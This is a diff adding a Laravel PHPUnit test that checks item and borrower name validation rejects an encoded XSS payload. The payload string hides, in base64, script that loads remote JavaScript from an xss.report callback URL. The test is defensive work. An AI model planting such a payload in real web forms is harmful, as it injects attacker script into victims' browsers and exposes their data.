@@ -55,4 +55,24 @@ class SecurityValidationTest extends TestCase
         $this->assertTrue($validator->fails());
         $this->assertArrayHasKey('institution_name', $validator->errors()->toArray());
     }
+
+    public function test_encoded_xss_payloads_in_names_are_rejected(): void
+    {
+        $payload = '%22%3E%3Cimg%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL2FuYW1hbmpheXNsZWJldyI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;%20onerror=evalatob(this.id)%3E211222233334324csscsccnjsnjwnjnjenjnennn';
+
+        $itemValidator = Validator::make(
+            ['name' => $payload],
+            (new StoreItemRequest())->rules()
+        );
+
+        $borrowerValidator = Validator::make(
+            ['institution_name' => $payload],
+            (new StoreBorrowerRequest())->rules()
+        );
+
+        $this->assertTrue($itemValidator->fails());
+        $this->assertArrayHasKey('name', $itemValidator->errors()->toArray());
+        $this->assertTrue($borrowerValidator->fails());
+        $this->assertArrayHasKey('institution_name', $borrowerValidator->errors()->toArray());
+    }
 }
